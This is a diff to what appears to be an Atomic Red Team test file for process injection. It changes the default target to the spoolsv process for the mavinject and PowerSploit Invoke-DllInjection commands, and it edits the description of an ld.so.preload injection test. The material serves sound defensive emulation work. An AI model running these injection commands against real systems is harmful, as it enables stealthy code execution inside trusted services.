@@ -18,12 +18,13 @@ atomic_tests:
     process_id:
       description: PID of input_arguments
       type: Int
-      default: $pid
+      default: (get-process spoolsv).id
   executor:
     name: powershell
     elevation_required: true
     command: |
-      mavinject #{process_id} /INJECTRUNNING #{dll_payload}
+      $mypid = #{process_id}
+      mavinject $mypid /INJECTRUNNING #{dll_payload}
 
 - name: Process Injection via PowerSploit
   description: |
@@ -40,16 +41,17 @@ atomic_tests:
     process_id:
       description: PID of input_arguments
       type: Int
-      default: $pid
+      default: (get-process spoolsv).id
   executor:
     name: powershell
     elevation_required: true
     command: |
-      Invoke-DllInjection.ps1 -ProcessID #{process_id} -Dll #{dll_payload}
+      $mypid = #{process_id}
+      Invoke-DllInjection.ps1 -ProcessID $mypid -Dll #{dll_payload}
 
 - name: Shared Library Injection via /etc/ld.so.preload
   description: |
-    This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.
+    This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package. 
   supported_platforms:
     - linux
   input_arguments:
